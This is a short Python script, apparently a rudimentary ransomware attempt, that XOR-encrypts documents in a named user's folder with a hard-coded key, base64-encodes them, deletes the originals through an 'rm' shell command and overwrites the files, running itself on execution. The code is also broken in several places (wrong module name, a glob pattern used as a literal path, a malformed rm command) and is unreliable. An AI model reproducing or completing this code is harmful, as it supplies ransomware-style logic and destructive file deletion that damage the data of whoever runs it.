from crypto.cipher import XOR
import base64
import os
import sys

def encrypt():
    key = 'RM83594'
    cipher = XOR.new(key)
    pathfile = '/Users/Pedro/documentos/*.txt, *.pdf, *.doc'
    openfile = open(pathfile, 'rb')
    readfile = openfile.read()
    openfile.close()
    encoding = base64.b64encode(cipher.encrypt(readfile))
    os.system('rm'+pathfile)
    openfile2 = open(pathfile, 'wb')
    openfile2.write(encoding)
    openfile2.close()

encrypt()